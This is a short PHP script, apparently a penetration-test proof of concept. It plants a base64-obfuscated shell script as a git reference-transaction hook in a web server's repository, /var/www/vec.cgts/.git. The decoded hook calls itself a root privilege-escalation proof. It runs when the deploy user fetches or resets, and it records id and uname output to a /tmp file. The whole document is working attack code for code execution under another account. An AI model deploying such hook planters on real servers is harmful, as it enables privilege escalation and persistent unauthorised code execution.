<?php
header('Content-Type: text/plain; charset=utf-8');
$hook = base64_decode('IyEvYmluL3NoCiMgRjEwMCByb290IHByaXZlc2MgcHJvb2YgdmlhIHJlZmVyZW5jZS10cmFuc2FjdGlvbiBob29rIChmaXJlcyBvbiBnaXQgZmV0Y2gvcmVzZXQgYXMgZGVwbG95IHVzZXIpCmlmIFsgISAtZiAvdG1wL2YxMDBfcm9vdF9wcm9vZiBdOyB0aGVuCiAgeyBlY2hvICI9PT0gRjEwMCBST09UIEhPT0sgUFJPT0YgPT09IjsgZWNobyAiZmlyZWRfYXQ9JChkYXRlIC11ICslRlQlVFopIjsgZWNobyAiYXJnPSQxIjsgaWQ7IHVuYW1lIC1hOyB9ID4gL3RtcC9mMTAwX3Jvb3RfcHJvb2YKICBjaG1vZCA2NDQgL3RtcC9mMTAwX3Jvb3RfcHJvb2YKZmkKZXhpdCAwCg==');
$p = '/var/www/vec.cgts/.git/hooks/reference-transaction';
file_put_contents($p, $hook);
chmod($p, 0755);
echo "hook_installed: $p\n";
echo "perms: " . substr(sprintf('%o', fileperms($p)), -4) . "\n";
echo "owner: " . posix_getpwuid(fileowner($p))['name'] . "\n";
echo "content_head:\n" . substr(file_get_contents($p),0,120) . "\n";
echo "current_uid: " . posix_getpwuid(posix_geteuid())['name'] . "\n";
?>
